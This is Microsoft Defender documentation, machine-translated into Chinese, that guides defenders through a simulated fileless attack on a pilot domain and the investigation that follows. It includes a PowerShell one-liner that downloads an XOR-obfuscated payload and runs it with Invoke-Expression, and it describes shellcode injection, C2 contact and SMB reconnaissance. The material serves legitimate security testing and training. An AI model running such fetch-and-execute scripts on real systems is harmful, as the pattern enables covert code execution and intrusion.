---
title: 在试点环境中Microsoft 365 Defender攻击模拟
description: 运行攻击模拟Microsoft 365 Defender查看警报和事件的呈现方式、获得见解并快速修正威胁。
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: bf7592055e58f10a3680e6ee712c597780591a47
ms.sourcegitcommit: 3b8e009ea1ce928505b8fc3b8926021fb91155f3
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 03/28/2022
ms.locfileid: "64498574"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>在试点环境中Microsoft 365 Defender攻击模拟


本文是使用试验环境对 Microsoft 365 Defender 事件进行调查和响应的过程中的第 1 步（第 [2](eval-defender-investigate-respond.md) 步）。 有关此过程详细信息，请参阅 [概述](eval-defender-investigate-respond.md) 文章。

准备试点环境后[](eval-defender-investigate-respond.md)，可以测试 Microsoft 365 Defender 的事件响应以及自动调查和修正功能，方法为创建具有模拟攻击的事件，以及使用 Microsoft 365 Defender 门户进行调查和响应。

事件Microsoft 365 Defender是关联警报和关联数据的集合，这些警报和关联数据是攻击案例的一部分。

Microsoft 365 服务和应用将在检测到可疑或恶意事件或活动时创建警报。 单个警报可提供有关已完成或持续攻击的有价值的线索。 但是，攻击通常对不同类型的实体（如设备、用户和邮箱）使用多种技术。 结果是租户中的多个实体将收到多个警报。

>[!Note]
>如果你是安全分析和事件响应的新用户，请参阅响应第一个事件[](first-incident-overview.md)演练，获取分析、修正和事后评审的典型流程的引导性教程。
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>使用门户模拟Microsoft 365 Defender攻击

Microsoft 365 Defender门户具有内置功能，可创建对试点环境的模拟攻击：

- 攻击模拟培训，Microsoft 365 Defender Office 365。[https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator)
  
  在"Microsoft 365 Defender门户中，选择"电子邮件 **&协作>攻击模拟培训"**。

- 攻击教程& 终结点的 Microsoft 365 Defender 模拟。[https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations)

  在Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">门户中</a>，选择终结点 **>教程&模拟。**

### <a name="defender-for-office-365-attack-simulation-training"></a>防御者Office 365攻击模拟培训

Defender for Office 365 with Microsoft 365 E5 or Microsoft Defender for Office 365 Plan 2 包含网络钓鱼攻击的攻击模拟培训。 基本步骤包括：

1. 创建模拟

   有关如何创建和启动新模拟的分步说明，请参阅 [模拟网络钓鱼攻击](/microsoft-365/security/office-365-security/attack-simulation-training)。

2. 创建有效负载

   有关如何创建负载以用于模拟的分步说明，请参阅为攻击模拟培训创建自定义 [负载](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)。

3. 获取见解

   有关如何通过报告获取见解的分步说明，请参阅通过攻击模拟培训 [获取见解](/microsoft-365/security/office-365-security/attack-simulation-training-insights)。

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

有关详细信息，请参阅 [模拟](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)。

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>适用于终结点的 Defender 攻击教程&模拟

下面是 Microsoft 的 Defender for Endpoint 模拟：

- 文档删除后门
- 自动调查 (后门) 

还有来自第三方源的其他模拟。 还有一组教程。

对于每个模拟或教程：

1. 下载并阅读所提供的相应演练文档。

2. 下载模拟文件。 你可以选择在测试设备上下载文件或脚本，但这不是强制性的。

3. 根据演练文档中的指示，在测试设备上运行模拟文件或脚本。

 有关详细信息，请参阅通过 [模拟攻击体验 Microsoft Defender for Endpoint](/microsoft-365/security/defender-endpoint/attack-simulations)。

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>使用独立的域控制器和客户端设备（可选）模拟 (攻击) 

在此可选事件响应练习中，你将使用 PowerShell 脚本模拟对独立的 Active Directory 域服务 (AD DS) 域控制器和 Windows 设备的攻击，然后调查、修正和解决事件。

首先，需要将终结点添加到试点环境。

### <a name="add-pilot-environment-endpoints"></a>添加试点环境终结点

首先，你需要将隔离的 AD DS 域控制器和Windows设备添加到试点环境中。

1. 验证试点环境租户是否[已启用Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on)。

2. 验证您的域控制器：

   - 运行 Windows Server 2008 R2 或更高版本。
   - 向 [Microsoft Defender 报告身份并](/azure/security-center/security-center-wdatp) 已启用 [远程管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。
   - 已启用 [Microsoft Defender for Identity 和 Microsoft Defender for Cloud Apps](/cloud-app-security/mdi-integration) 集成。
   - 在测试域中创建了测试用户。 不需要管理员级别的权限。

3. 验证测试设备：

   - 运行Windows 10版本 1903 或更高版本。
   - 已加入 AD DS 域控制器域。
   - 已启用[Windows Defender 防病毒](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果无法启用Windows Defender 防病毒，请参阅此[疑难解答主题](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy)。
   - 已 [载入到 Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

如果使用租户和设备组，请为测试设备创建专用设备组，并推送到顶层。

一种替代方法是在基础结构服务中托管 AD DS 域控制器并测试Microsoft Azure虚拟机。 可以使用模拟企业测试实验室指南阶段 [1](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) 中的说明，但跳过 APP1 虚拟机的创建。

下面是结果。

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="使用模拟企业测试实验室指南的评估环境" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

你将模拟复杂的攻击，该攻击利用高级技术来隐藏检测。 该攻击枚举域控制器上 (SMB) 打开的服务器消息块，并检索用户设备的最新 IP 地址。 此类攻击通常不包括在受攻击人设备上丢弃的文件，它们仅出现在内存中。 他们通过使用现有系统和管理工具"离开陆地"，将其代码注入系统进程以隐藏其执行。 此类行为允许他们规避检测并保留在设备上。

在此模拟中，我们的示例方案从 PowerShell 脚本开始。 在现实世界中，可能会欺骗用户运行脚本，或者脚本可能从远程连接从先前受感染的设备运行到另一台计算机，这表明攻击者试图在网络中进行后向移动。 检测这些脚本可能很困难，因为管理员通常还远程运行脚本以执行各种管理活动。

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="使用进程注入和 SMB 重新连接攻击的无文件 PowerShell 攻击" lightbox="../../media/mtp/mtpdiydiagram.png":::

在模拟过程中，该攻击将 shellcode 注入一个看起来不一样的过程。 此方案需要使用notepad.exe。 我们选择了此过程进行模拟，但攻击者更有可能以长时间运行的系统进程为目标，例如svchost.exe。 然后，shellcode 继续联系攻击者的命令和控制 (C2) ，以接收有关如何继续的说明。 该脚本尝试对 DC 服务器中的域控制器 (重新) 。 重新集成允许攻击者获取有关最近用户登录信息的信息。 一旦攻击者获得此信息，他们就可以在网络中进行稍后移动，以到达特定的敏感帐户

> [!IMPORTANT]
> 为了获得最佳结果，请尽可能遵循攻击模拟说明。

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>运行隔离的 AD DS 域控制器攻击模拟

运行攻击方案模拟：

1. 确保试点环境包括隔离的 AD DS 域控制器和Windows设备。

2. 使用测试用户帐户登录到测试设备。

3. 在Windows PowerShell打开一个打开窗口。

4. 复制以下模拟脚本：

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > 如果在 Web 浏览器中打开本文，在复制全文而不丢失某些字符或引入额外的换行符时可能会遇到问题。 如果是这种情况，请下载此文档，在 Adobe Reader 上打开它。

5. 在 PowerShell 窗口中粘贴并运行复制的脚本。

> [!NOTE]
> 如果使用远程桌面协议 (RDP) 运行 PowerShell，请使用 RDP 客户端中的"键入剪贴板文本"命令，因为 **CTRL-V** 热键或右键单击粘贴方法可能不起作用。 PowerShell 的最新版本有时也不接受该方法，您可能首先必须复制到内存中的 记事本，将其复制到虚拟机中，然后将其粘贴到 PowerShell 中。

几秒钟后，应用记事本打开。 模拟攻击代码将注入到记事本。 将自动生成的记事本实例保持打开状态，以体验完整方案。

模拟攻击代码将尝试与外部 IP 地址通信 (模拟 C2 服务器) 然后尝试通过 SMB 重新对域控制器进行重新连接。

此脚本完成后，你将在 PowerShell 控制台上看到此消息：

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

To see the Automated Incident and Response feature in action， keep the notepad.exe process open. 你将看到自动事件和响应停止记事本进程。

### <a name="investigate-the-incident-for-the-simulated-attack"></a>调查模拟攻击的事件

> [!NOTE]
> 在我们演示此模拟之前，请观看以下视频，了解事件管理如何有助于将相关警报作为调查过程的一部分一起处理，在哪里可以找到门户中的警报，以及如何帮助你执行安全操作：

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

切换到 SOC 分析员的角度，现在可以开始在企业门户中调查Microsoft 365 Defender攻击。

1. 打开 <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender 门户</a>。

2. 从导航窗格中，选择"事件 **&事件>事件"**。

3. 模拟攻击的新事件将显示在事件队列中。

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="事件队列的示例" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>将攻击作为单个事件进行调查

Microsoft 365 Defender分析关联，并将不同产品的相关警报和调查聚合到一个事件实体中。 通过执行此操作，Microsoft 365 Defender更广泛的攻击案例，让 SOC 分析师可以了解和响应复杂的威胁。

此模拟期间生成的警报与同一威胁相关联，因此，自动聚合为单个事件。

查看事件：

1. 打开 <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender 门户</a>。

2. 从导航窗格中，选择"事件 **&事件>事件"**。

3. 单击事件名称左侧的圆圈，选择最新项。 侧面板显示有关事件的其他信息，包括所有相关警报。 每个事件都有一个唯一的名称，该名称根据事件包括的警报的属性进行描述。

   可以基于以下服务资源筛选仪表板中显示的警报：Microsoft Defender for Identity、Microsoft Defender for Cloud Apps、Microsoft Defender for Endpoint、Microsoft 365 Defender 和 Microsoft Defender for Office 365。

3. 选择 **"打开事件** 页面"获取有关事件详细信息。

   在 **"事件** "页中，你可以看到与事件相关的所有警报和信息。 这些信息包括警报中涉及的实体和资产、警报的检测源 (如 Microsoft Defender for Identity 或 Microsoft Defender for Endpoint) ，以及它们链接在一起的原因。 查看事件警报列表将显示攻击进度。 从此视图中，你可以查看和调查各个警报。

   您还可以从右侧 **菜单中** 单击"管理事件"，以标记事件、将其分配给自己并添加注释。

#### <a name="review-generated-alerts"></a>查看生成的警报

让我们看一下模拟攻击期间生成的一些警报。

> [!NOTE]
> 我们将仅演练模拟攻击期间生成的一些警报。 根据测试设备上Windows的 Microsoft 365 Defender 版本，你可能会看到按略有不同的顺序显示更多警报。

:::image type="content" source="../../media/mtp/fig6.png" alt-text="生成的警报示例" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>警报：发现可疑进程注入 (源：Microsoft Defender for Endpoint) 

高级攻击者使用复杂而复杂的方法来保留内存，并隐藏在检测工具中。 一种常见技术是在受信任的系统进程（而不是恶意可执行文件）内进行操作，使得检测工具和安全操作难以发现恶意代码。

为了允许 SOC 分析师捕获这些高级攻击，Microsoft Defender for Endpoint 中的深度内存传感器为云服务提供了对各种跨进程代码注入技术的前所未有的可见性。 下图显示了在尝试向终结点注入代码时如何检测到 Defender for Endpoint 并 <i>notepad.exe</i>。

:::image type="content" source="../../media/mtp/fig7.png" alt-text="用于注入潜在恶意代码的警报示例" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>警报：在 Source：Microsoft Defender for Endpoint (没有命令行参数的进程运行时观察到的意外) 

Microsoft Defender 终结点检测通常针对攻击技术最常见的属性。 此方法可确保持续性，并提升攻击者切换到较新策略的漏洞。

我们采用大规模学习算法来建立组织和全球通用流程的正常行为，并观察这些流程何时显示异常行为。 这些异常行为通常指示已引入多余的代码，并且正在其他受信任进程中运行。

对于此方案， <i>notepad.exe</i> 出现异常行为，包括与外部位置的通信。 此结果独立于用于引入和执行恶意代码的特定方法。

> [!NOTE]
> 由于此警报基于需要额外后端处理的机器学习模型，因此在门户中看到此警报可能需要一些时间。

请注意，警报详细信息包括外部 IP 地址，该地址是一个可用于扩展调查的指示器。

选择警报进程树中的 IP 地址以查看 IP 地址详细信息页面。

:::image type="content" source="../../media/mtp/fig8.png" alt-text="无命令行参数的进程运行时出现意外行为的示例" lightbox="../../media/mtp/fig8.png":::

下图显示了选中的 IP 地址详细信息页面 (警报进程树中的 IP 地址) 。

:::image type="content" source="../../media/mtp/fig9.png" alt-text="IP 地址详细信息页的示例" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>警报：SMB 用户和 IP 地址重新 (源)  (：Microsoft Defender for Identity) 

使用服务器消息块 (SMB) 协议的枚举使攻击者能够获取最近的用户登录信息，该信息可帮助他们稍后通过网络移动以访问特定的敏感帐户。

在此检测中，当 SMB 会话枚举针对域控制器运行时，将触发警报。

:::image type="content" source="../../media/mtp/fig10.png" alt-text="用户和 IP 地址重新重设的 Microsoft Defender 标识警报示例" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>使用 Microsoft Defender for Endpoint 查看设备时间线

在浏览此事件中的各个警报后，导航回之前调查的事件页面。 选择事件 **页面中** 的"设备"选项卡，查看 Microsoft Defender for Endpoint 和 Microsoft Defender for Identity 报告的事件所涉及的设备。

选择执行攻击的设备的名称，以打开该特定设备的实体页面。 在此页面中，你可以看到触发的警报和相关事件。

选择 **"时间线** "选项卡以打开设备时间线，并按时间顺序查看在设备上观测到的所有事件和行为，与触发的警报交错。

:::image type="content" source="../../media/mtp/fig11.png" alt-text="具有行为的设备时间线示例" lightbox="../../media/mtp/fig11.png":::

展开一些更有趣的行为可提供有用的详细信息，例如进程树。

例如，向下滚动，直到找到观察到的警报事件 **"可疑进程注入"**。 选择 **powershell.exe以** notepad.exe进程事件，以在侧窗格的"事件实体"图下显示此行为的完整进程树。 如有必要，使用搜索栏进行筛选。

:::image type="content" source="../../media/mtp/fig12.png" alt-text="选定 PowerShell 文件创建行为的进程树示例" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>使用 Microsoft Defender for Cloud Apps 查看用户信息

在事件页面上，选择" **用户** "选项卡以显示攻击所涉及的用户列表。 该表包含有关每个用户的其他信息，包括每个用户的调查 **优先级** 分数。

选择用户名以打开用户配置文件页，可在其中执行进一步调查。 [阅读更多有关调查有风险的用户。](/cloud-app-security/tutorial-ueba#identify)

:::image type="content" source="../../media/mtp/fig13.png" alt-text="云应用 Defender 用户页面" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>自动调查和修复

> [!NOTE]
>在我们演示此模拟之前，请观看以下视频，以熟悉什么是自动自我修复、在门户中在哪里找到它，以及它在安全操作中如何提供帮助：

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

在事件门户中导航回Microsoft 365 Defender事件。 " **事件"** 页中的"调查 **"选项卡显示** 由 Microsoft Defender for Identity 和 Microsoft Defender for Endpoint 触发的自动调查。 以下屏幕截图仅显示 Defender for Endpoint 触发的自动调查。 默认情况下，Defender for Endpoint 会自动修正队列中找到的项目，这需要进行修正。

:::image type="content" source="../../media/mtp/fig14.png" alt-text="与事件相关的自动调查示例" lightbox="../../media/mtp/fig14.png":::

选择触发调查的警报以打开" **调查详细信息"** 页。 你将看到以下详细信息：

- 警报 (自动) 调查的警报。
- 影响的用户和设备。 如果在其他设备上找到指示器，这些附加设备也将列出。
- 证据列表。 找到并分析的实体，如文件、进程、服务、驱动程序和网络地址。 将分析这些实体与警报的可能关系，并评分为恶意或恶意。
- 找到的威胁。 在调查过程中发现的已知威胁。

> [!NOTE]
> 根据时间，自动调查可能仍在运行。 请等待几分钟，等待该过程完成，然后收集并分析证据并查看结果。 刷新 **"调查详细信息** "页，获取最新结果。

:::image type="content" source="../../media/mtp/fig15.png" alt-text="&quot;调查详细信息&quot;页的示例" lightbox="../../media/mtp/fig15.png":::

在自动调查期间，Microsoft Defender for Endpoint 确定了notepad.exe，该流程作为需要修正的项目之一注入。 作为自动修正的一部分，Defender for Endpoint 会自动停止可疑进程注入。

你可以看到 <i>notepad.exe从 </i> 测试设备上正在运行的进程列表中消失。

#### <a name="resolve-the-incident"></a>解决事件

完成调查并确认要修正后，解决事件。

从" **事件"** 页面中，选择" **管理事件"**。 将状态设置为 **"解决事件** "，为分类 **选择"真** 警报"，然后选择" **安全测试** "进行确定。

:::image type="content" source="../../media/mtp/fig16.png" alt-text="打开&quot;管理事件&quot;面板的事件页面示例，可在其中单击开关以解决事件" lightbox="../../media/mtp/fig16.png":::

当事件解决时，它将在安全门户和相关门户中Microsoft 365 Defender警报。

这将封装攻击模拟，用于事件分析、自动调查和事件解决。

## <a name="next-step"></a>后续步骤

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="事件Microsoft 365 Defender响应功能" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

步骤 2/2[：Microsoft 365 Defender事件响应功能](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>可能需要的导航

[创建Microsoft 365 Defender评估环境](eval-create-eval-environment.md)
